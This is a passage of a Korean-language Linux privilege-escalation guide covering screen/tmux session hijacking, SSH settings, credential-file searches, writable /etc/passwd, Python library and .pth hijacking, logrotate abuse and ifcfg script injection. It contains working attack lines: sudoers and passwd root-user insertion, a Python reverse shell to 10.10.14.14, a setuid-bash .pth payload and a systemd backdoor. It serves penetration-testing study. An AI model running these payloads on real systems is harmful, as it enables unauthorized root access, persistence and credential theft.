`user:alice:rw-`와 같은 항목이 보인다면, 제한적인 mode bits에도 불구하고 해당 사용자는 sudo 규칙을 추가할 수 있습니다:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

이것은 영향도가 큰 ACL persistence/privesc 경로입니다. `ls -l`만 확인하는 검토에서는 놓치기 쉽습니다.

## 열린 셸 세션

사용자 간 GNU Screen 접근은 버전만이 아니라 **실행 중인 세션의 설정과 ACL**에 따라 달라집니다. [GNU Screen 문서](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html)에 따르면 GNU Screen은 multiuser 지원을 포함해 빌드되어야 하며, `multiuser on`과 `acladd` 또는 적절한 `aclchg` 권한 부여가 있어야 다른 사용자가 세션에 연결할 수 있습니다. [매뉴얼에서는 사용자 간 세션 조회를 위해 setuid-root도 요구합니다](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html). root 소유 소켓이 보이거나 SUID `screen` 바이너리가 있다는 사실만으로는 연결 가능한 root 셸이 있다고 볼 수 없습니다. 이를 권한 상승으로 판단하기 전에 실행 중인 세션에서 multiuser가 활성화되어 있는지, 현재 사용자가 실질적인 입력/명령 권한을 가지고 있는지, 그리고 해당 세션의 셸이 권한이 높은 소유자로 실행 중인지 확인하세요.

### screen 세션 하이재킹

**screen 세션 목록 표시**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![screen sessions hijacking - 소켓 위치 (일부 시스템에서는 한쪽이 다른 쪽의 심볼릭 링크로 표시됨): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**세션에 연결**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

이는 **오래된 tmux 버전**에서 발생하던 문제였습니다. 비권한 사용자로 root가 생성한 tmux(v2.1) 세션을 hijack할 수 없었습니다.

**tmux 세션 나열**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![소켓 위치(일부 시스템에서는 한쪽을 다른 쪽의 심볼릭 링크로 노출함) - tmux sessions hijacking: tmux -S /tmp/dev sess ls 해당 소켓을 사용해 목록을 조회합니다. 해당 소켓에서 tmux 세션을 시작할 수 있습니다...](<../../images/image (837).png>)

**세션에 연결**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

**HTB의 Valentine box**에서 예시를 확인하세요.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

취약했던 과거 기간에 영향을 받는 Debian 또는 파생 배포판의 OpenSSL 빌드로 생성된 키는 예측 가능한 난수를 사용했을 수 있습니다. 현재 호스트의 배포판이나 패치된 OpenSSL 버전만으로는 과거 키의 생성 방식을 확인할 수 없습니다. 적절한 과거 블랙리스트와 키의 출처를 바탕으로 **해당 키 자체**를 확인하세요. Debian의 [`ssh-vulnkey` 매뉴얼](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html)에는 공개 키와 `authorized_keys`를 확인하는 방법이 설명되어 있으며, [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1)에는 OpenSSL 수정 사항이 기록되어 있습니다. 권한이 높은 계정의 `authorized_keys`에 항목이 있다고 해서 곧바로 권한 상승이 가능한 것은 아닙니다. 그에 대응하는 개인 키를 확보할 수 있고, 실제 SSH 정책이 해당 계정에서 그 키를 여전히 허용해야 합니다. 취약한 **호스트** 키 자체는 로그인 자격 증명이 아닙니다. 유출된 키를 교체하고 기존 키 승인을 제거하세요.

### 흥미로운 SSH 설정 값

- **PasswordAuthentication:** 암호 인증을 허용할지 지정합니다. OpenSSH 업스트림 기본값은 `yes`이며, 배포판 설정으로 재정의될 수 있습니다.
- **PubkeyAuthentication:** 공개 키 인증을 허용할지 지정합니다. 기본값은 `yes`입니다.
- **PermitEmptyPasswords**: 암호 인증이 허용된 경우, 암호가 빈 계정의 로그인을 서버에서 허용할지 지정합니다. 기본값은 `no`입니다.

### 로그인 제어 파일

이 파일들은 로그인 가능한 사용자와 로그인 방식을 제어합니다.

- **`/etc/nologin`**: 파일이 있으면 root가 아닌 사용자의 로그인을 차단하고 파일의 메시지를 출력합니다.
- **`/etc/securetty`**: root가 로그인할 수 있는 위치를 제한합니다(TTY 허용 목록).
- **`/etc/motd`**: 로그인 후 표시되는 배너입니다(환경 정보나 유지 관리 세부 정보가 leak될 수 있음).

### PermitRootLogin

root의 SSH 로그인을 허용할지 지정합니다. OpenSSH 업스트림 기본값은 `prohibit-password`이며, 배포판 설정으로 재정의될 수 있습니다. 가능한 값은 다음과 같습니다.

- `yes`: root가 암호와 개인 키를 사용해 로그인할 수 있습니다.
- `without-password` 또는 `prohibit-password`: root는 개인 키로만 로그인할 수 있습니다.
- `forced-commands-only`: Root는 개인 키를 사용하고 명령 옵션이 지정된 경우에만 로그인할 수 있습니다.
- `no` : 허용하지 않습니다.

### 신뢰된 SSH 사용자 인증서 인증 기관

`TrustedUserCAKeys`는 sshd가 **사용자** 인증서 서명에 신뢰하는 공개 키를 지정합니다. 대응하는 개인 CA 키를 권한이 낮은 사용자가 읽을 수 있다면, 누가 인증서를 발급받을 수 있는지와 해당 인증서로 어떤 계정에 인증할 수 있는지 확인하세요. `AuthorizedPrincipalsFile` 또는 `AuthorizedPrincipalsCommand`를 사용해 허용되는 이름을 제한할 수 있습니다. 둘 다 설정되지 않았다면 인증서에 대상 계정 이름이 포함되어 있어야 합니다. `PermitRootLogin prohibit-password`는 root 암호 인증을 차단하지만 인증서 인증은 허용할 수 있습니다. 키 경로가 노출되었다고 해서 접근이 가능하다는 뜻은 아닙니다. 공개 키와 개인 키의 쌍, 실제 적용되는 `Match` 규칙, 계정 정책, 키 암호, 폐기 여부, 허용되는 서명 알고리즘을 확인하세요. 열거 결과에 개인 키 데이터를 포함하지 마세요. [OpenSSH 서버 설정 매뉴얼](https://man.openbsd.org/sshd_config#TrustedUserCAKeys)을 참고하세요.

권한 위임 규칙으로 현재 사용자가 키 소유자의 권한으로 제한 없는 [인증서 서명자(예: `ssh-keygen -s`)](https://man.openbsd.org/ssh-keygen#-s)를 실행할 수 있다면, 개인 CA 키를 읽을 수 없어도 사용할 수 있습니다. 허용된 정확한 명령과 인수를 서명자 계정의 키 접근 권한, 실제 적용되는 sshd 설정에서 신뢰하는 공개 CA, 대상 계정에 허용되는 principal, 인증서 유효 기간, 해당 계정의 로그인 정책과 함께 확인하세요. 위임된 서명자 명령이나 신뢰된 CA 파일만으로 다른 계정에 접근할 수 있다고 단정할 수는 없습니다. 수동 열거 중에는 테스트 인증서에 서명하지 마세요.

### AuthorizedKeysFile

사용자 인증에 사용할 공개 키가 들어 있는 파일을 지정합니다. 홈 디렉터리로 대체되는 `%h` 같은 토큰을 포함할 수 있습니다. **절대 경로**(`/`로 시작)를 지정하거나 **사용자의 홈 디렉터리를 기준으로 한 상대 경로**를 지정할 수 있습니다. 예:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

해당 설정은 사용자의 "**testusername**" **private** 키로 로그인을 시도하면 ssh가 해당 키의 public key를 `/home/testusername/.ssh/authorized_keys` 및 `/home/testusername/access`에 있는 키와 비교한다는 것을 의미합니다.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding을 사용하면 서버에 passphrase가 없는 키를 두는 대신 **로컬 SSH 키를 사용할 수 있습니다**. 따라서 ssh로 **호스트에 jump한 다음**, 그곳에서 **처음 호스트에 있는 키를 사용해 다른 호스트로 다시 jump할 수 있습니다**.

이 옵션을 `$HOME/.ssh.config`에 다음과 같이 설정해야 합니다:

```
Host example.com
  ForwardAgent yes
```

`Host`가 매번 사용자가 다른 머신으로 이동할 때 `*`로 설정되어 있으면 해당 호스트가 키에 액세스할 수 있다는 점에 유의하세요(보안 문제입니다).

`/etc/ssh_config` 파일은 이 **options**를 **override**하여 이 설정을 허용하거나 거부할 수 있습니다.\
`/etc/sshd_config` 파일은 `AllowAgentForwarding` 키워드를 사용해 ssh-agent forwarding을 **허용**하거나 **거부**할 수 있습니다(기본값은 허용).

환경에서 Forward Agent가 설정되어 있다면 다음 페이지를 확인하세요. **이를 악용해 권한을 상승시킬 수 있습니다**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

`/etc/profile` 파일과 `/etc/profile.d/` 아래의 파일은 **사용자가 새 셸을 실행할 때 실행되는 스크립트**입니다. 따라서 이 중 하나라도 **쓸 수 있거나 수정할 수 있다면 권한을 상승시킬 수 있습니다**.

```bash
ls -l /etc/profile /etc/profile.d/
```

이상한 profile script를 발견하면 **민감한 정보**가 있는지 확인해야 합니다.

### Passwd/Shadow 파일

OS에 따라 `/etc/passwd` 및 `/etc/shadow` 파일의 이름이 다르거나 백업 파일이 있을 수 있습니다. 따라서 **모든 파일을 찾고**, 파일을 **읽을 수 있는지 확인**하여 파일 안에 **해시가 있는지** 확인하는 것이 좋습니다:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

경우에 따라 `/etc/passwd`(또는 이에 상응하는 파일)에서 **비밀번호 해시**를 찾을 수 있습니다.

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### 쓰기 가능한 /etc/passwd

먼저 다음 명령 중 하나를 사용해 비밀번호를 생성합니다.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

그런 다음 사용자 hacker를 추가하고 생성된 비밀번호를 설정합니다.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

예: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

이제 `hacker:hacker`를 사용해 `su` 명령을 실행할 수 있습니다.

또는 다음 줄을 사용해 비밀번호가 없는 더미 사용자를 추가할 수 있습니다.\
경고: 시스템의 현재 보안 수준을 저하시킬 수 있습니다.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

참고: BSD 플랫폼에서 `/etc/passwd`는 `/etc/pwd.db`와 `/etc/master.passwd`에 있으며, `/etc/shadow`는 `/etc/spwd.db`로 이름이 변경됩니다.

**민감한 파일에 쓸 수 있는지** 확인해야 합니다. 예를 들어, **서비스 구성 파일**에 쓸 수 있나요?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

예를 들어, 시스템에서 **tomcat** 서버를 실행 중이고 **/etc/systemd/ 내의 Tomcat 서비스 구성 파일을 수정할 수 있다면,** 다음 행을 수정할 수 있습니다:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

다음에 tomcat이 시작될 때 backdoor가 실행됩니다.

### 폴더 확인

다음 폴더에 백업이나 흥미로운 정보가 있을 수 있습니다: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (마지막 폴더는 읽을 수 없을 가능성이 높지만 시도해 보세요.)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### 이상한 위치/소유한 파일

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### 최근 몇 분 내 수정된 파일

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### SQLite DB 파일

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

For readable application databases, 사용자 이름과 password hash를 나타내는 테이블 및 열 이름을 확인하세요. hash를 찾는 것, 해당 hash의 password를 복구하는 것, 그리고 복구한 password가 로컬 계정에서 재사용되는 것을 입증하는 것은 서로 별개의 단계입니다. 일반적인 32자리 16진수 문자열만으로 MD5 hash인지 또는 계정에 접근할 수 있는지 추론하기에는 충분하지 않습니다.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

읽을 수 있는 shell history에 `sudo` 명령 다음으로 짧고 비밀번호처럼 보이는 줄이 있으면, 주변 줄을 직접 확인하세요. 일반적인 `sudo` 프롬프트에 입력한 비밀번호는 shell history에 저장되지 않습니다. 다음 줄은 실수로 shell에 입력했을 가능성이 있을 뿐, 유효한 비밀번호라는 증거는 아닙니다. `.sudo_as_admin_successful` marker는 과거에 사용한 기록이지, 현재 권한이 있음을 나타내지는 않습니다.

### 숨겨진 파일

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH의 스크립트/바이너리**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **웹 파일**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **백업**

백업 디렉터리 안에서 읽을 수 있는 파일과 이름에 `backup`이 포함된 파일을 살펴보세요. 이름이 불분명하거나 확장자가 암호화된 아카이브도 오래된 애플리케이션 데이터를 노출할 수 있습니다. 암호화된 아카이브는 노출 가능성이 있는 대상일 뿐입니다. 암호 복구, 아카이브 내용 확인, 애플리케이션 해시 복구, 해당 암호를 Unix 계정에 재사용하는 것은 각각 별도로 확인해야 합니다. 아카이브에 해시가 있다고 해서 로컬 로그인이 가능하다는 뜻은 아닙니다.

읽을 수 있는 가상 머신 백업도 같은 방식으로 검토해야 합니다. VirtualBox `.vbox` 구성 파일은 연결된 `.vdi` 이미지를 식별할 수 있으며 암호화된 디스크 키 메타데이터를 포함할 수 있습니다. [VirtualBox 문서에 따르면 암호화된 데이터 키는 VM 구성 파일에 저장됩니다](https://docs.oracle.com/en/virtualization/virtualbox/7.0/User/AdvancedTopics.html). 오프라인 디스크 검토를 하려면 구성 파일과 이미지 모두에 접근할 수 있어야 합니다. 게스트 볼륨에는 별도의 키가 필요한 자체 [LUKS 암호화 계층](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc)이 있을 수 있습니다. 승인된 복호화 후에도 오래된 스크립트나 구성 파일에 암호가 들어 있을 수 있습니다. 이를 로컬 권한 상승으로 판단하기 전에 해당 자격 증명이 호스트 계정에서 현재 유효한지, 그리고 그 계정의 실효 `sudo` 정책이 권한이 높은 명령 실행을 허용하는지 확인하세요. 수동 열거 중에는 이미지를 복사하거나 복호화하거나 마운트하지 말고 경로와 권한만 확인하세요.

읽을 수 있는 아카이브를 살펴볼 때는 파일을 추출하기 전에 먼저 아카이브 내부 파일 이름을 나열하세요. 현재 사용 중인 파일이 보호되어 있더라도 숨겨진 인증 파일, 복구 코드 자료 또는 SSH 키가 들어 있을 수 있습니다. 파일 이름은 단서일 뿐이므로 자료와 계정 재사용 여부를 별도로 확인하세요.

백업 디렉터리에서는 다른 사용자가 소유한 **읽을 수 있는 아카이브**를 우선적으로 확인하세요. 특히 root 소유 아카이브와 그룹 멤버십을 통해 접근할 수 있는 아카이브를 살펴보세요. 오래된 아카이브에는 현재 사용 중인 파일이 보호되어 있더라도 구성 정보나 인증 비밀이 들어 있을 수 있습니다. [Backrest](https://garethgeorge.github.io/backrest/)와 같은 로컬 백업 UI의 경우 서비스의 실효 계정과 낮은 권한의 사용자가 해당 구성 파일을 읽거나 UI에 인증할 수 있는지 확인하세요. [Hooks](https://garethgeorge.github.io/backrest/docs/hooks)와 [restic 명령 인터페이스](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto)는 데몬의 파일 및 명령 권한으로 동작할 수 있습니다. 루프백 리스너라는 사실만으로는 영향이 결정되지 않습니다. Backrest의 `passwordBcrypt`는 [인증 코드](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go)에 있는 base64 인코딩 bcrypt 해시이지 평문 암호가 아닙니다. 노출된 아카이브나 UI를 권한 경계로 간주하기 전에 서비스의 실행 계정, 사용할 수 있는 자격 증명, 관련 계획 또는 저장소에 대한 접근 권한을 확인하세요.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### 비밀번호가 들어 있을 수 있는 파일

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)의 코드를 살펴보세요. **비밀번호가 들어 있을 수 있는 여러 파일**을 검색합니다.\
이 작업에 사용할 수 있는 **또 다른 유용한 도구**는 [**LaZagne**](https://github.com/AlessandroZ/LaZagne)입니다. Windows, Linux 및 Mac의 로컬 컴퓨터에 저장된 다양한 비밀번호를 가져오는 데 사용하는 오픈 소스 애플리케이션입니다.

`/etc/guacamole/guacamole.properties`를 읽을 수 있다면 `mysql-*`, `postgresql-*` 또는 `sqlserver-*` 데이터베이스 연결 설정을 확인하세요. 해당 계정에 Guacamole JDBC 테이블을 읽을 권한이 있는 경우, `guacamole_connection_parameter`에 저장된 SSH `username`, `password`, `private-key` 또는 `passphrase` 값이 있을 수 있습니다. 연결 ID와 매개변수 이름부터 확인한 다음, 관련 행만 살펴보세요. 저장된 값은 재사용 가능한 비밀 정보가 아니라 동적 토큰이나 vault 참조일 수도 있습니다. [Guacamole JDBC 스키마](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html)와 [SSH 연결 매개변수](https://guacamole.apache.org/doc/gug/configuring-guacamole.html)를 참고하세요.

[pswm 비밀번호 관리자](https://github.com/Julynx/pswm#usage)는 기본적으로 `~/.local/share/pswm/pswm`에 암호화된 vault를 저장합니다. 다른 사용자의 vault가 보인다면 소유권과 현재 계정으로 실제로 읽을 수 있는지 확인하세요. vault 경로만으로는 자격 증명을 알 수 없습니다. master password를 복구하고, 재사용 가능한 계정 비밀번호를 찾고, 해당 계정의 권한을 확인하는 것은 각각 별개의 단계입니다.

[Passpie의 기본 데이터베이스](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database)는 `.keys` keyring과 그룹 디렉터리 아래의 암호화된 `.pass` 자격 증명 파일이 있는 `~/.passpie/`입니다. 데이터베이스 디렉터리가 보이는 것은 경로를 찾는 단서일 뿐입니다. 키와 관련 암호화 항목에 접근할 수 있는지, master passphrase가 필요한지, 복구한 자격 증명이 더 높은 권한을 가진 계정에 속하는지 확인하세요. Passpie는 [사용자 지정 데이터베이스 경로](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases)도 지원하므로 기본 경로만으로는 모든 위치를 찾을 수 없습니다. 자동 열거에서는 자격 증명을 내보내거나 키 자료를 출력하지 말고 메타데이터만 나열해야 합니다.

### 로그

로그를 읽을 수 있다면 **로그에서 흥미롭거나 기밀인 정보**를 찾을 수 있습니다. 로그가 낯설수록 더 흥미로울 가능성이 큽니다.\
또한 일부 "**잘못**" 구성된(백도어가 있을 수 있는?) **감사 로그**는 이 게시물에서 설명한 것처럼 감사 로그에 **비밀번호를 기록**할 수 있습니다: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

**로그를 읽으려면** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **그룹이 매우 유용합니다.**

### Shell 파일

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### 일반적인 Creds 검색/Regex

파일 **이름**이나 **내용**에 "**password**"라는 단어가 포함되어 있는지 확인하고, 로그에서 IP와 이메일, 또는 해시 정규식도 확인해야 합니다.\
이 모든 방법을 여기서 설명하지는 않겠지만, 관심이 있다면 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)가 수행하는 마지막 검사를 확인해 보세요.

## 쓰기 가능한 파일

### Python library hijacking

Python 스크립트가 **어디서** 실행될지 알고 있고 해당 폴더에 **쓸 수 있거나** Python 라이브러리를 **수정할 수 있다면**, OS 라이브러리를 수정해 백도어를 심을 수 있습니다(Python 스크립트가 실행될 폴더에 쓸 수 있다면 os.py 라이브러리를 복사해 붙여넣으세요).

**라이브러리에 백도어를 심으려면** os.py 라이브러리 끝에 다음 줄을 추가하세요(IP와 PORT를 변경하세요):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `site.addsitedir()`로 처리되는 쓰기 가능한 `.pth`

`site.addsitedir(DIR)`를 `sys.path.append(DIR)`와 동일하게 취급하지 마세요. 이 함수는 `DIR`의 모든 `*.pth` 파일도 처리합니다. `import` 뒤에 공백이나 탭이 오는 줄은 Python 코드로 실행됩니다. 반면 경로 줄은 site 디렉터리를 기준으로 해석되며, 해당 경로가 존재할 때만 추가됩니다.<sup>[[38]](#references)</sup>

sudo 사용이 허용된 Python 프로그램이나 그 밖의 권한이 있는 Python 프로그램이 현재 사용자 또는 사용자가 속한 그룹이 쓸 수 있는 디렉터리에 `site.addsitedir()`를 호출하면 privilege escalation이 발생할 수 있습니다. 권한이 있는 프로그램이 import 경로를 설정하는 동안, 정상 동작을 실행하기 전에 `.pth` 코드가 실행됩니다.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

실행 가능한 `.pth` 콘텐츠는 한 줄이어야 하지만, 세미콜론을 사용하면 여러 문장을 넣을 수 있습니다. 예를 들어, root 권한으로 실행되는 경로에서 setuid Bash 복사본을 만들 수 있습니다. 유효 ID를 유지하도록 `-p` 옵션을 사용해 Bash를 실행하세요.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

`-S` 옵션은 Python의 자동 `site` 초기화만 비활성화합니다. 프로그램이 명시적으로 `site`를 가져오고 `site.addsitedir()`를 호출하는 경우에는 보호하지 않습니다. 권한이 있는 import 경로에서 공격자가 쓸 수 있는 디렉터리를 제거하고, 디렉터리와 해당 `.pth` 파일의 소유자 및 쓰기 권한이 권한 있는 관리자에게만 있도록 해야 합니다.<sup>[[38]](#references)[[39]](#references)</sup>

### Logrotate 악용

권한이 있는 `logrotate` 작업은 회전 중에 낮은 권한의 사용자가 교체하거나 리디렉션할 수 있는 디렉터리 아래의 로그를 실제로 회전할 때, 사용자 간 파일 쓰기 경로를 만들 수 있습니다. 로그를 쓸 수 있다는 사실만으로는 단서일 뿐입니다. 실제 적용 중인 규칙과 `create`, `olddir`, `su` 지시문, 스케줄러의 실효 사용자 ID, 로그의 상위 디렉터리에 대한 쓰기 및 검색 권한, 그리고 설치된 빌드와 정책이 대상 변경을 허용하는지를 확인하세요. 나중에 권한이 있는 셸이 생성된 파일을 로드해야 시작 파일 쓰기가 명령 실행으로 이어집니다. 회전을 트리거하거나 race를 시도하지 말고 스케줄, 규칙, 버전/패키징, 경로 메타데이터를 검사하세요.

> [!TIP]
> `3.18.0`이나 버전 문자열만을 악용 가능 여부의 기준으로 삼지 마세요. [Upstream의 변경 로그](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md)에는 여러 릴리스에서 디렉터리 및 심볼릭 링크 보안 강화가 기록되어 있으며, 배포판은 수정 사항을 백포트할 수 있습니다. [Upstream 매뉴얼](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in)은 권한이 없는 사용자가 제어하는 디렉터리의 로그를 root가 회전할 때 `su`를 사용할 것을 권장합니다. 실제 적용 중인 규칙과 동작을 확인하세요.

취약점에 관한 더 자세한 정보는 다음 페이지에서 확인할 수 있습니다: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

이 취약점은 [**logrotten**](https://github.com/whotwagner/logrotten)을 사용해 악용할 수 있습니다.

이 취약점은 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx 로그)**와 매우 유사합니다. 따라서 로그를 변경할 수 있음을 발견하면 해당 로그를 관리하는 주체를 확인하고, 로그를 심볼릭 링크로 대체해 권한을 상승할 수 있는지 확인하세요.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**취약점 참고 자료:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

낮은 권한의 사용자가 `ifcfg-*` 파일을 만들거나 변경할 수 **있고**, 권한이 있는 네트워크 활성화 경로가 해당 파일을 실제로 읽는 경우 해당 파일은 검토할 단서가 됩니다. 실제 파일과 디렉터리 권한, 선택된 인터페이스, 설치된 `ifup`/`ifdown` 구현, 그리고 이를 실행하는 주체를 확인하세요. 파일을 쓸 수 있다는 사실만으로는 코드가 실행되지 않습니다. [Red Hat의 RHEL 7 네트워킹 가이드](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files)는 레거시 네트워크 스크립트와 NetworkManager를 구분합니다. NetworkManager 자체는 전자를 트리거하지 않습니다. [RHEL 8 문서](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking)에 따르면 기본 `ifup`/`ifdown`은 NetworkManager를 사용하며, 선택 사항인 레거시 패키지는 셸 스크립트를 제공합니다.

권한이 있는 레거시 스크립트를 실제로 사용하는 시스템에서는 인용되지 않은 셸 소싱 `ifcfg-*` 대입문(예: `NAME=`)이 코드 실행 경계를 넘을 수 있습니다. 정확한 파서, 값, 활성화 경로를 확인하세요. 파일 이름이나 NetworkManager가 존재한다는 사실만으로 셸 해석을 추정하지 마세요. 호출자가 파일을 직접 편집할 수 없더라도, 호출자 입력을 `ifcfg-*` 파일에 쓰고 레거시 `ifup`을 호출하는 sudo 허용 래퍼는 이 경계로 이어지는 별도의 경로입니다.

예: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Network과 /bin/id 사이의 공백에 유의하세요_)

### **init, init.d, systemd, and rc.d**

